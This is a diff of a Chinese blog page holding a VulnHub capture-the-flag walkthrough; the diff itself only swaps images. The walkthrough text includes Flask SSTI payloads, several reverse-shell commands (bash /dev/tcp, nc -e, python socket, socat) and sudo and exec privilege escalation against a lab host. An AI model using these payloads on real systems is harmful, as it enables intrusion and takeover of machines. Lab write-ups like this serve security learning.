@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DgEuWxkZS9RwIlz.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/AG1hjZYM3aSKz6H.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/LwdGZVHeWR3Kv6z.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/1idBqMQ7tmDOfXW.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KW4nDo2ZJuVILkS.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BId2kKHmufXsrnl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/iqT6cP9kuwrzyLx.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BCMkIXvxWUj69pG.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VfOmDtw751FRCXl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/JUZqV6zBpbmk97w.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/zqTVIhAkrmZgoSj.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ixAYytdZ8HLRET2.jpg"></li>
         </ul>
       </div>
     </header>
@@ -176,83 +176,83 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 <p>1 ）确定靶机 ip 地址和开放的端口<br>
 由已至内网靶机所在主机 MAC 地址自动扫描靶机地址<br>
  <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1242.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1242.png" width="520" alt="Image">
 <p>2 ）扫到 ip 之后对 ip 进行端口扫描<br>
  <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs nmap -PA</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1243.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1243.png" width="660" alt="Image">
 <blockquote>
 <p>这样扫看似扫出来了所有的端口，但是端口里的具体信息却没有识别，由于之前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透，比如 git 泄漏、dns 解析域名泄漏、各种服务的版本都含有更多的敏感信息。因此，需要对得到的服务器进一步深入扫描得到端口信息</p>
 </blockquote>
 <p>3 ）端口详细扫描<br>
  <code>sudo nmap -A -p- 192.168.31.17 --min-rate 5000</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1244.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1244.png" width="520" alt="Image">
 <p>-&gt; 靶机 ip：192.168.31.17 靶机开放端口 21,22,80,5000</p>
 <h3 id="ida反编译elf"><a class="markdownIt-Anchor" href="#ida反编译elf">#</a> IDA 反编译 ELF</h3>
 <p>匿名登陆 ftp 服务器寻找敏感信息，得到 pub 文件夹下的 url 文件</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1245.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1245.png" width="420" alt="Image">
 <p>用 file 命令可以判断出 url 是一个 ELF 文件，要反编译 ELF 文件需要借助 IDA, 工具，这里将此文件传输到了一台具有 IDA 工具的电脑上</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1246.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1246.png" width="660" alt="Image">
 <p>反编译之后在 main 方法中看到 /sh4d0w$s</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1247.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1247.png" width="660" alt="Image">
 <h3 id="leet加密语言"><a class="markdownIt-Anchor" href="#leet加密语言">#</a> leet 加密语言</h3>
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTc=">http://192.168.31.17</span> 进行信息收集</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1248.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1248.png" width="280" alt="Image">
 <p>看到一个奇怪的数字和英文单词 leet，查了一下其具体代表什么含义</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1249.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1249.png" width="680" alt="Image">
 <p>原来是一种黑客的加密语言，可以根据这一点生成一份字典</p>
 <p>利用 crunch 命令生成一份字典  <code>crunch 6 6 1337leet -o wordlist.txt</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1250.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1250.png" width="440" alt="Image">
 <p>由之前反编译产生的一个疑似目录的文件，进行访问</p>
 <p>[<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTcvc2g0ZDB3">http://192.168.31.17/sh4d0w</span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>192.168.31.17</mn><mi mathvariant="normal">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding="application/x-tex">s](http://192.168.31.17/sh4d0w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">3</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mord">7</span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord">4</span><span class="mord mathnormal">d</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>s)</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1251.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1251.png" width="380" alt="Image">
 <h3 id="网站信息收集"><a class="markdownIt-Anchor" href="#网站信息收集">#</a> 网站信息收集</h3>
 <p>扫描一下此网站是否存在敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17/</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1252.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1252.png" width="660" alt="Image">
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC8=">http://192.168.31.17:5000/</span> 进行信息收集</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1253.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1253.png" width="430" alt="Image">
 <p>访问地址 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcw==">http://192.168.31.17:5000/sh4d0w$s</span></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1254.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1254.png" width="470" alt="Image">
 <p>页面有回显表示漏洞就在这个地方，现在我们有一个敏感的 url 地址和一份字典，可以根据此字典爆破此 url 地址的输入</p>
 <h3 id="ffuf模糊测试"><a class="markdownIt-Anchor" href="#ffuf模糊测试">#</a> ffuf 模糊测试</h3>
 <p>使用 ffuf 测试 input 的参数应该是字典中的哪个<br>
  <code>ffuf - u &quot;http://192.168.31.17:5000/sh4d0w\$s?FUZZ=/etc/passwd&quot; -w wordli.txt -fs 8</code> <br>
  加载到了一个为 l333tt 的地址，此种情况下页面回显为 200</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1255.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1255.png" width="620" alt="Image">
 <p>访问此网站，发现了回显与输入的内容一致</p>
 <p>[<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=">http://192.168.31.17:5000/sh4d0w</span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mi>p</mi><mi>w</mi><mi>d</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant="normal">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding="application/x-tex">s?l333tt=pwd](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mclose">?</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">3</span><span class="mord">3</span><span class="mord">3</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">3</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord">4</span><span class="mord mathnormal">d</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>s?l333tt=pwd)</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1256.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1256.png" width="430" alt="Image">
 <p>换成其他的参数之后发现回显依旧是输入本身</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1257.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1257.png" width="560" alt="Image">
 <p>利用 wappalyzer 发现网站时 python 写的、用的 flask 框架</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1258.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1258.png" width="660" alt="Image">
 <h3 id="ssti模板注入"><a class="markdownIt-Anchor" href="#ssti模板注入">#</a> SSTI 模板注入</h3>
 <p>既然是 flask 框架，就可以测试 SSTI 模版注入</p>
 <p>[<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=">http://192.168.31.17:5000/sh4d0w</span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo stretchy="false">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mo>&lt;</mo><mo stretchy="false">!</mo><mo>−</mo><mo>−</mo><mi>s</mi><mi>w</mi><mi>i</mi><mi>g</mi><mtext>￼</mtext><mn>2</mn><mo>−</mo><mo>−</mo><mo>&gt;</mo><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant="normal">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding="application/x-tex">s?l333tt=100](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mclose">?</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">3</span><span class="mord">3</span><span class="mord">3</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">￼</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">3</span><span class="mord">1</span><span class="mord">.</span><span class="mord">1</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">/</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord">4</span><span class="mord mathnormal">d</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>s?l333tt=100)</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1259.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1259.png" width="520" alt="Image">
 <p>命令成功被执行，表示 SSTI 模板注入漏洞是存在的，如果不用浏览器进行渗透，用终端进行命令行访问的话需要编码及转义</p>
 <p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9lbmMvdXJsZW5jb2RlLw==">https://www.bejson.com/enc/urlencode/</span> 上进行 url 编码</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1260.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1260.png" width="420" alt="Image">
 <p><code>curl http://192.168.31.17:5000/sh4d0w\$s?l333tt=%7B%7B10*10%7D%7D</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1261.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1261.png" width="470" alt="Image">
 <p>接下来就用这个模板的漏洞进行反弹 shell，先用最基础的试试<br>
  <code>&#123;% import os %&#125;&#123;&#123;os.system('bash -c "bash -i >&/dev/tcp/192.168.31.99/4444 >&1"')&#125;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1262.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1262.png" width="520" alt="Image">
 <p>服务器返回了错误，得换其他的方式</p>
 <h3 id="ssti模板注入绕过"><a class="markdownIt-Anchor" href="#ssti模板注入绕过">#</a> SSTI 模板注入绕过</h3>
 <p>用 url 编码尝试能否绕过</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1263.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1263.png" width="620" alt="Image">
 <p>绕过失败，回显显示错误，shell 没有反弹出来，当然 curl 可能因为编码和转义的原因不太准确，不确定的话可以使用浏览器确认一下</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1264.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1264.png" width="700" alt="Image">
 <p>尝试用以下方式执行系统命令 (浏览器会默认对空格、引号等自动 url 编码，直接访问即可)：<br>
  <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls -la').read()&#125;&#125;</code> <br>
  <code>http://192.168.31.17:5000/sh4d0w\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1265.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1265.png" width="660" alt="Image">
 <p>命令执行成功，返回了 ls -al 命令的信息，判断目标站点是否存在 nc、python、bash 等可反弹 shell 的命令</p>
 <p><code>http://192.168.31.17:5000/sh4d0w\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1266.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1266.png" width="660" alt="Image">
 <p>用 nc 来反弹 shell：<br>
  <code>http://192.168.31.17:5000/sh4d0w\$s?&#123;&#123;%20config.__class__.__init__.__globals__[]%27os%27].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&#125;&#125;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1267.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1267.png" width="620" alt="Image">
 <p>拿到 webshell 之后就是对其进行输出一个标准的 shell，就不多说了</p>
 <h3 id="socat反弹shell"><a class="markdownIt-Anchor" href="#socat反弹shell">#</a> socat 反弹 shell</h3>
 <p>查看 sudo -l 时，看到可以无密码执行 kori 下的一个命令</p>
@@ -261,47 +261,47 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
  <code>sudo -u kori /bin/php /home/kori/jail.php python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31. 99 &quot;,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>
 </blockquote>
 <p>反弹失败了，查看 /home/kori/jail.php 文件，发现在 jail.php 文件中基本上能反弹 shell 的命令都给过滤掉了，包括一些特殊字符都不能在使用，我们能否绕过这些过滤信息，一旦绕过过滤，我们所输入的命令就会被执行</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1268.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1268.png" width="630" alt="Image">
 <blockquote>
 <p>发现服务器上是存在 socat 命令的，socat 可以算做是高级一点的 nc，并且反弹 shell 的时候只需要分号不需要其他的特殊符号的参与，后面详细介绍 socat 的使用方法，这里先把 shell 反弹出来<br>
  <code>nc - lvvp 3335</code> <br>
  <code>sudo -u kori /bin/php /home/kori/jail.php socat exec:'sh',pty,stderr,setsid,sigint,sane</code> <br>
  <code>tcp:192.168.31.99:4445</code></p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1270.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1270.png" width="700" alt="Image">
 <p>反弹后同样先获取一个标准的 tty，查看权限设置时看到了一条命令，可调用 irida 用户用 cp 命令将其用户目录下的 irida.apk 文件拷贝到 kori 下</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1271.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1271.png" width="560" alt="Image">
 <h3 id="权限设置错误"><a class="markdownIt-Anchor" href="#权限设置错误">#</a> 权限设置错误</h3>
 <p>直接执行这条命令，看会有什么样的回显产生</p>
 <p><code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code> <br>
  发现权限不允许，通过 chmod o+w . 给其他用户添加写权限，再次复制成功了</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1272.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1272.png" width="520" alt="Image">
 <p>查看此文件的权限时，发现还是属于 irida 用户，如果我们先用 kori 用户创建 irida.apk 的文件，再将 irida 用户目录下的 apk 文件复制过来，那么最后得到的文件的权限就会归属于 kori 用户<br>
  <code>rm - f irida.apk;touch irida.apk; chmod +777 irida.apk</code> <br>
  <code>sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1273.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1273.png" width="520" alt="Image">
 <h3 id="apk反编译"><a class="markdownIt-Anchor" href="#apk反编译">#</a> apk 反编译</h3>
 <p>将 apk 发送到一台 windows 虚拟机或者主机上，尝试反编译<br>
  <code>scp irida.apk administrator@192.168.31.16:/E:/Desktop</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1274.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1274.png" width="520" alt="Image">
 <p>在 github 上搜索得到 AndroidKiller 一款用来反编译 apk 的工具</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1275.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1275.png" width="660" alt="Image">
 <p>用此工具打开 apk 文件即可自动的进行反编译</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1276.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1276.png" width="660" alt="Image">
 <p>经过一段时间后，apk 被成功反编译为了 jar 文件</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1277.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1277.png" width="660" alt="Image">
 <p>而 jar 文件是可以直接采用 IDEA 打开的，但是打开之后是不允许编辑的，可以借助 IDEA 工具对其源码进行审计，然后复制出关键的信息进行利用</p>
 <h3 id="idea反编译jar"><a class="markdownIt-Anchor" href="#idea反编译jar">#</a> IDEA 反编译 jar</h3>
 <p>在 jar 文件中找到一个登陆数据，调用了一个方法，将该方法的输出结果作为登陆进去的密码</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1278.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1278.png" width="660" alt="Image">
 <p>拉取这部分的代码，执行构造的代码，反向输出原有的密码</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1279.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1279.png" width="660" alt="Image">
 <p>得到密码 eye.of.the.tiger (), 并且可依靠此密码登陆到 irida 用户下</p>
 <p>找到 irida 用户的一条用户权限设置错误，可调用 python3 <span class="exturl" data-url="aHR0cDovL3huLS1vcmFzLXBrNmhnNDVxLnB5">执行 oras.py</span></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1280.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1280.png" width="520" alt="Image">
 <p>但是现在的问题是没有权限去查看 oras.py 到底有什么内容，只能根据执行后的回显结果进行猜测<br>
  <code>sudo /usr/bin/python3 /root/oras.py</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1281.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1281.png" width="470" alt="Image">
 <p>需要输入一个参数，并且错误信息提示我们需要输入的是一个十六进制的数据</p>
 <h3 id="python输出hex"><a class="markdownIt-Anchor" href="#python输出hex">#</a> python 输出 hex</h3>
 <blockquote>
@@ -310,29 +310,29 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 在命令输出<br>
 一个 whoami 的十六进制数据并将这个数据作为后面那个脚本的输入，字符串中的’b’字符前缀使变量成为字节类型。</p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1282.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1282.png" width="570" alt="Image">
 <p>这里输了一些命令之后命令被挤掉了，说明 stty 设置的不够严谨，重新 reset 一下，stty 如何设置前面有介绍这里就直接利用</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1283.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1283.png" width="620" alt="Image">
 <p>上述命令因为符号转义问题即括号的书写不规范导致命令错误，这里不确定自己的命令是否正确，就分为了两部执行，先打印出十六进制，运行后面的脚本，并把十六进制数据作为后者的输入，正常的写法为</p>
 <p><code>python3 -c &quot;print(b\&quot;whoami\&quot;.hex())&quot;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1284.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1284.png" width="370" alt="Image">
 <p>将 whoami 的十六进制数据 77686f616d69 带入脚本中执行，看到报错代码内容为 exec（name），而 print (exec (‘whoami’)) 是错误的语法</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1285.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1285.png" width="340" alt="Image">
 <h3 id="py-exec执行命令"><a class="markdownIt-Anchor" href="#py-exec执行命令">#</a> py exec 执行命令</h3>
 <p>搜索 python 的 exec 如何执行，在下图的示例中，可见需要在 exec 中添加的内容为 print（‘Hello World’）的形式</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1286.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1286.png" width="520" alt="Image">
 <p>同样先把 print (‘Hello World’) 转为为十六进制<br>
  <code>python3 -c &quot;print(b\&quot;print('Hello World')\&quot;.hex())&quot;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1287.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1287.png" width="460" alt="Image">
 <p>将得到的数据 7072696e74282748656c6c6f20576f726c642729 带入到脚本中执行，执行成功，并且打印出来了 Hello World</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1288.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1288.png" width="370" alt="Image">
 <p>通过 python 命令行引入 os 包，以 os 包下的 system 执行系统命令<br>
  <code>python3 -c &quot;print(b\&quot;__import__('os').system('whoami')\&quot;.hex())&quot;</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1289.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1289.png" width="580" alt="Image">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 /root/oras.py</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-1290.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1290.png" width="480" alt="Image">
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过nc将root的shell反弹出来</span></span><br><span class="line">python3 -c &quot;print(b\&quot;__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/bash 192.168.31.99 4446&#x27;)\&quot;.hex())&quot; | sudo python3 /root/oras.py</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f62617368203139322e3136382e33312e393920343434362729</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="/N1h1l157/VULNHUB/image-1291.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1291.png" width="700" alt="Image">
 <p>-&gt; 最终拿到了 root 权限</p>
 <h3 id="socat通信"><a class="markdownIt-Anchor" href="#socat通信">#</a> socat 通信</h3>
 <blockquote>
@@ -342,51 +342,51 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
 </blockquote>
